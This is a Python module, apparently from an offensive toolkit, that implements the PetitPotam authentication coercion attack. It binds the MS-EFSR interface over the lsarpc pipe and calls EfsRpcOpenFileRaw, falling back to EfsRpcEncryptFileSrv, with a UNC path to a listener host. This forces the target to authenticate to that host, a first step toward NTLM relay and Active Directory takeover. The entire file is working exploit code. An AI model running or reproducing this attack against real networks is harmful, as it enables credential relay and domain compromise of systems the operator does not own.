# -*- coding: utf-8 -*-
"""PetitPotam via native DCE/RPC on PIPE\\lsarpc (pysmb)."""

from __future__ import annotations

from lib.protocols.samr.dcerpc import DceRpcClient, DceRpcError
from lib.protocols.samr.ndr import pack_unique_wstring, pack_ulong, pack_uuid
from lib.protocols.samr.smb_transport import SmbPipeTransport

_EFS_UUID = pack_uuid("c681d488-d850-11d0-8c52-00c04fd90f7e", 1)
_EFS_OPEN_FILE_RAW = 0
_EFS_ENCRYPT_FILE_SRV = 4

_COERCE_SUCCESS_MARKERS = (
    "ERROR_BAD_NETPATH",
    "rpc_s_access_denied",
    "0x0000035b",
    "0x00000005",
)


def _coerce_success(exc: Exception) -> bool:
    text = str(exc)
    return any(marker in text for marker in _COERCE_SUCCESS_MARKERS)


def petitpotam_coerce(
    username: str,
    password: str,
    domain: str,
    dc_ip: str,
    listener: str,
    target: str,
) -> bool:
    path = f"\\\\{listener}\\test\\Settings.ini"
    transport = SmbPipeTransport(
        host=target,
        username=username,
        password=password,
        domain=domain,
        remote_name=target,
        pipe_name="lsarpc",
    )
    dce = DceRpcClient(transport)
    try:
        dce.connect()
        dce.bind(_EFS_UUID)
        stub = pack_unique_wstring(path, referent=1) + pack_ulong(0)
        try:
            dce.request(_EFS_OPEN_FILE_RAW, stub)
        except DceRpcError as exc:
            if _coerce_success(exc):
                return True
            if "access_denied" in str(exc).lower() or "0x00000005" in str(exc):
                dce.request(_EFS_ENCRYPT_FILE_SRV, pack_unique_wstring(path, referent=1))
            else:
                raise
    except DceRpcError as exc:
        if not _coerce_success(exc):
            raise
    finally:
        dce.close()
    return True
